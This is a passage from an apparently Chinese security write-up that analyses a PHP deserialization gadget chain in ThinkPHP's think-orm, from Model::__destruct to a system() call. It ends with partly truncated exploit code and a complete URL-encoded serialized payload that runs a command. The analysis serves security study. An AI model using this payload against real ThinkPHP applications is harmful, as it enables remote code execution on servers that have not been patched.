没找到相关，再看一眼代码，发现第九行中调用了`toArray()`方法，然后以`json`格式返回
那我们再看看`toArray()`方法
    public function toArray(): array
        {
            $item       = [];
            $hasVisible = false;
            foreach ($this->visible as $key => $val) {
                if (is_string($val)) {
                    if (strpos($val, '.')) {
                        [$relation, $name]          = explode('.', $val);
                        $this->visible[$relation][] = $name;
                    } else {
                        $this->visible[$val] = true;
                        $hasVisible          = true;
                    }
                    unset($this->visible[$key]);
                }
            }
            foreach ($this->hidden as $key => $val) {
                if (is_string($val)) {
                    if (strpos($val, '.')) {
                        [$relation, $name]         = explode('.', $val);
                        $this->hidden[$relation][] = $name;
                    } else {
                        $this->hidden[$val] = true;
                    }
                    unset($this->hidden[$key]);
                }
            }
            // 合并关联数据
            $data = array_merge($this->data, $this->relation);
            foreach ($data as $key => $val) {
                if ($val instanceof Model || $val instanceof ModelCollection) {
                    // 关联模型对象
                    if (isset($this->visible[$key]) && is_array($this->visible[$key])) {
                        $val->visible($this->visible[$key]);
                    } elseif (isset($this->hidden[$key]) && is_array($this->hidden[$key])) {
                        $val->hidden($this->hidden[$key]);
                    }
                    // 关联模型对象
                    if (!isset($this->hidden[$key]) || true !== $this->hidden[$key]) {
                        $item[$key] = $val->toArray();
                    }
                } elseif (isset($this->visible[$key])) {
                    $item[$key] = $this->getAttr($key);
                } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
                    $item[$key] = $this->getAttr($key);
根据第34行和第44行，第34行是遍历给定的数组语句`data`数组。每次循环中，当前单元的之被赋给`val`并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元），同时当前单元的键名也会在每次循环中被赋给变量`key`。第44行是将`val`和`key`相关联起来，漏洞方法是`getAtrr`触发，只需把`$data`设为数组就行。
在第47和49行中存在`getAttr`方法，那触发条件是啥呢？
`$this->visible[$key]`需要存在，而`$key`来自`$data`的键名，`$data`又来自`$this->data`，即`$this->data`必须有一个键名传给`$this->visible`，然后把键名`$key`传给`getAttr`方法，那岂不是默认就能触发...?
跟进`getAttr`方法，`vendor/topthink/think-orm/src/model/concern/Attribute.php`
    /**
         * 获取器 获取数据对象的值
         * @access public
         * @param  string $name 名称
         * @return mixed
         * @throws InvalidArgumentException
         */
        public function getAttr(string $name)
        {
            try {
                $relation = false;
                $value    = $this->getData($name);
            } catch (InvalidArgumentException $e) {
                $relation = $this->isRelationAttr($name);
                $value    = null;
            }
            return $this->getValue($name, $value, $relation);
        }
在第18行中可以看到漏洞方法是`getValue`，但传入`getValue`方法中的`$value`是由`getData`方法得到的。
那就进一步跟进`getData`方法
    /**
         * 获取当前对象数据 如果不存在指定字段返回false
         * @access public
         * @param  string $name 字段名 留空获取全部
         * @return mixed
         * @throws InvalidArgumentException
         */
        public function getData(string $name = null)
        {
            if (is_null($name)) {
                return $this->data;
            }
            $fieldName = $this->getRealFieldName($name);
            if (array_key_exists($fieldName, $this->data)) {
                return $this->data[$fieldName];
            } elseif (array_key_exists($fieldName, $this->relation)) {
                return $this->relation[$fieldName];
            }
            throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
        }
可以看到`$this->data`是可控的（第16行），而其中的`$fieldName`来自`getRealFieldName`方法。
跟进`getRealFieldName`方法
    /**
         * 获取实际的字段名
         * @access protected
         * @param  string $name 字段名
         * @return string
         */
        protected function getRealFieldName(string $name): string
        {
            if ($this->convertNameToCamel || !$this->strict) {
                return Str::snake($name);
            }
            return $name;
        }
当`$this->strict`为`true`时直接返回`$name`，即键名`$key`
返回`getData`方法，此时`$fieldName=$key`，进入`if`语句，返回`$this->data[$key]`，再回到`getAttr`方法，
    return $this->getValue($name, $value, $relation);
即返回
    return $this->getValue($name, $this->data[$key], $relation);
跟进`getValue`方法
    /**
         * 获取经过获取器处理后的数据对象的值
         * @access protected
         * @param  string      $name 字段名称
         * @param  mixed       $value 字段值
         * @param  bool|string $relation 是否为关联属性或者关联名
         * @return mixed
         * @throws InvalidArgumentException
         */
        protected function getValue(string $name, $value, $relation = false)
        {
            // 检测属性获取器
            $fieldName = $this->getRealFieldName($name);
            if (array_key_exists($fieldName, $this->get)) {
                return $this->get[$fieldName];
            }
            $method = 'get' . Str::studly($name) . 'Attr';
            if (isset($this->withAttr[$fieldName])) {
                if ($relation) {
                    $value = $this->getRelationValue($relation);
                }
                if (in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])) {
                    $value = $this->getJsonValue($fieldName, $value);
                } else {
                    $closure = $this->withAttr[$fieldName];
                    if ($closure instanceof \Closure) {
                        $value = $closure($value, $this->data);
                    }
                }
            } elseif (method_exists($this, $method)) {
                if ($relation) {
                    $value = $this->getRelationValue($relation);
                }
第30行中，如果我们让`$closure`为我们想执行的函数名，`$value`和`$this->data`为参数即可实现任意函数执行。
所以需要查看`$closure`属性是否可控，跟进`getRealFieldName`方法，
    protected function getRealFieldName(string $name): string
        {
            if ($this->convertNameToCamel || !$this->strict) {
                return Str::snake($name);
            }
如果让`$this->strict==true`，即可让`$$fieldName`等于传入的参数`$name`，即开始的`$this->data[$key]`的键值`$key`，可控
又因为`$this->withAttr`数组可控，所以，`$closure`可控·，值为`$this->withAttr[$key]`，参数就是`$this->data`，即`$data`的键值，
所以我们需要控制的参数：
    $this->data不为空
    $this->lazySave == true
    $this->withEvent == false
    $this->exists == true
    $this->force == true
## EXP编写
### 捋一下
链子太长了，重新捋一下参数的传递过程，要不就懵了，倒着捋慢慢往前分析
先看`__toString()`的触发
    Conversion::__toString()
    Conversion::toJson()
    Conversion::toArray() //出现 $this->data 参数
    Attribute::getAttr()
    Attribute::getValue() //出现 $this->json 和 $this->withAttr 参数
    Attribute::getJsonValue() // 造成RCE漏洞
首先出现参数可控的点在`Conversion::toArray()`中（第二行），在这里如果控制`$this->data=['whoami'=>['whoami']]`，那么经过`foreach`遍历（第四行），传入`Attribute::getAttr()`函数的`$key`也就是`whoami`（19行）
    // 合并关联数据
            $data = array_merge($this->data, $this->relation);
            foreach ($data as $key => $val) {
                if ($val instanceof Model || $val instanceof ModelCollection) {
                    // 关联模型对象
                    if (isset($this->visible[$key]) && is_array($this->visible[$key])) {
                        $val->visible($this->visible[$key]);
                    } elseif (isset($this->hidden[$key]) && is_array($this->hidden[$key])) {
                        $val->hidden($this->hidden[$key]);
                    }
                    // 关联模型对象
                    if (!isset($this->hidden[$key]) || true !== $this->hidden[$key]) {
                        $item[$key] = $val->toArray();
                    }
                } elseif (isset($this->visible[$key])) {
                    $item[$key] = $this->getAttr($key);
                } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
                    $item[$key] = $this->getAttr($key);
然后在`Attribute::getAttr()`函数中，通过`getData()`函数从`$this->data`中拿到了数组中的`value`后返回
    public function getAttr(string $name)
        {
            try {
                $relation = false;
                $value    = $this->getData($name);
            } catch (InvalidArgumentException $e) {
                $relation = $this->isRelationAttr($name);
                $value    = null;
            }
            return $this->getValue($name, $value, $relation);
        }
getData()返回的是数组中相应的value，所以第5行的`$this->getData($name)`也就是`$this->getData($value=['whoami'])`
在`Attribute::getValue()`函数中对`withAttr`和`json`参数进行了验证
    $method = 'get' . Str::studly($name) . 'Attr';
            if (isset($this->withAttr[$fieldName])) {
                if ($relation) {
                    $value = $this->getRelationValue($relation);
                }
                if (in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])) {
                    $value = $this->getJsonValue($fieldName, $value);
                } else {
第2行的if语句中需要`$this->withAttr[$fieldName]`存在的同时需要是一个数组，`$this->withAttr['whoami'=>['system']]`
第7行if语句中中是判断`$fieldName`是否在`$this->json`中，即`in_array($fieldName,
$this->json)`，所以只需要`$this->json=['whoami']`
接下来分析一下`__destruct()`的触发过程
    Model::__destruct()
    Model::save()
    Model::updateData()
    Model::checkAllowFields()
    Model::db() // 触发 __toString()
首先在`Model::__destruct()`中`$this->lazySave`需要为`true`，参数可控
    public function __destruct()
        {
            if ($this->lazySave) {
                $this->save();
            }
        }
    }
`$this->lazySave=true`
然后在`Model::save()` 需要绕过`isEmpty()`和`$this->exists`参数
    // 数据对象赋值
            $this->setAttrs($data);
            if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
                return false;
            }
            $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
            if (false === $result) {
                return false;
            }
第4行的`$this->trigger('BeforeWrite')`是默认为`true`的，所以只要`$this->data`不为空即可
第8行中如果`this->exists`结果为`true`，那么就采用`this->updateData()`，如果不是就采用`this->insertData($sequence)`所以我们需要让`this->exists`结果为`true`
那么最后就是`Model::db()`方法，保证`$this->table`能触发`__toString()`（第八行）
    public function db($scope = []): Query
        {
            /** @var Query $query */
            $query = self::$db->connect($this->connection)
                ->name($this->name . $this->suffix)
                ->pk($this->pk);
            if (!empty($this->table)) {
                $query->table($this->table . $this->suffix);
            }
### 编写
首先`Model`类是一个抽象类，不能实例化，所以要想利用，得找出 `Model` 类的一个子类进行实例化，而且`use`了刚才`__toString`
利用过程中使用的接口`Conversion`和`Attribute`，所以关键字可以直接用
将上面捋出来的需要的属性全部重新编写
    lazySave = true;
                $this->data = ['whoami'=>['whoami']];
                $this->exists = true;
                $this->table = $obj;    // 触发__toString
                $this->withAttr = ['whoami'=>['system']];
                $this->json = ['whoami'];
                $this->jsonAssoc = true;
            }
        }
    }
全局搜索`extends Model`，找到一个`Pivot`类继承了`Model`
    lazySave = true;
                $this->data = ['whoami'=>['whoami']];
                $this->exists = true;
                $this->table = $obj;    // 触发__toString
                $this->withAttr = ['whoami'=>['system']];
                $this->json = ['whoami'];
                $this->jsonAssoc = true;
            }
        }
    }
    namespace think\model {
        use think\Model;
        class Pivot extends Model {
        }
        // 实例化
        $p = new Pivot(new Pivot());
        echo urlencode(serialize($p));
    }
    O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D